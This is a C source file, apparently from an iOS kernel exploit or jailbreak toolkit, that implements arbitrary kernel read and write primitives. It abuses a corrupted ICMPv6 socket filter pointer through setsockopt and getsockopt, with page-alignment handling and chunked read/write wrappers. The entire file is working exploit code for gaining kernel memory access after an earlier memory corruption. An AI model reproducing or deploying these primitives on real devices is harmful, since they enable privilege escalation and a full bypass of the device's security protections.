#include "krw.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>


static bool cs2_set_target_kaddr(uint64_t where) {
    if (where <= 0xfffff00000000000){
        // lab: upstream walk_backtrace (libjailbreak) dropped; the LOG_ERR is
        // the diagnostic. An invalid kaddr here means the corruption window
        // drifted -- retry the run rather than proceed.
        LOG_ERR("cs2_set_target_kaddr: invalid kaddr %#llx", where);
        return false;
    }
    memset(cs2_ctx.control_data, 0, sizeof(cs2_ctx.control_data));
    // set the address we want to read from
    memcpy(cs2_ctx.control_data, &where, sizeof(where));

    // socket_t sock, int level, int optname, const void *optval, int optlen
    // we're writting rw_sockets icmp6filt ptr
    int res = setsockopt(cs2_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, cs2_ctx.control_data, sizeof(cs2_ctx.control_data));
    if (res != 0) {
        LOG_ERR("cs2_set_target_kaddr: setsockopt: %s (%d)", strerror(errno), errno);
        return false;
    }
    return true;
}

void cs2_early_kreadbuf(uint64_t where, void *readBuf, size_t size)
{
    //printf("kreadbuf %#llx %p %#lx\n", where, readBuf, size); fflush(stdout); usleep(10000);
    
    if (size > CS2_EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
        return;
    }
    
    uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (CS2_EARLY_KRW_LENGTH - size);
    }
    
    //printf("offset %#llx\n", offset); fflush(stdout); usleep(10000);

    if (!cs2_set_target_kaddr(where - offset)) {
        LOG_ERR("cs2_early_kreadbuf: failed to set target kaddr\n");
        return;
    }
    uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
    
    socklen_t read_data_length = CS2_EARLY_KRW_LENGTH;
    int res = getsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, &read_data_length);
    if (res != 0) {
        LOG_ERR("getsockopt failed!!!\n");
        return;
    }
    
    memcpy(readBuf, &tmpBuf[offset], size);
}

uint64_t cs2_early_kread64(uint64_t where)
{
    uint64_t value = 0;
    cs2_early_kreadbuf(where, &value, sizeof(value));
    return value;
}

void cs2_early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
{
    if (size > CS2_EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
        return;
    }
    
    uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (CS2_EARLY_KRW_LENGTH - size);
    }
    uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
    cs2_early_kreadbuf(where - offset, tmpBuf, CS2_EARLY_KRW_LENGTH);
    memcpy(&tmpBuf[offset], writeBuf, size);

    if (!cs2_set_target_kaddr(where - offset)) {
        LOG_ERR("cs2_early_kwritebuf: failed to set target kaddr\n");
        return;
    }
    int res = setsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, CS2_EARLY_KRW_LENGTH);
    if (res != 0) {
        LOG_ERR("setsockopt failed!!!\n");
        return;
    }
}

void cs2_early_kwrite64(uint64_t where, uint64_t what)
{
    cs2_early_kwritebuf(where, &what, sizeof(what));
}

int cs2_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint8_t *output8 = (uint8_t *)output;
    size_t bytes_read = 0;

    while (bytes_read < size) {
        size_t chunk = (size - bytes_read < CS2_EARLY_KRW_LENGTH) ? (size - bytes_read) : CS2_EARLY_KRW_LENGTH;
        cs2_early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk);
        bytes_read += chunk;
    }
    return 0;
}

int cs2_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    uint8_t *input8 = (uint8_t *)input;
    size_t bytes_written = 0;

    while (bytes_written < size) {
        size_t chunk = (size - bytes_written < CS2_EARLY_KRW_LENGTH) ? (size - bytes_written) : CS2_EARLY_KRW_LENGTH;
        cs2_early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk);
        bytes_written += chunk;
    }
    return 0;
}
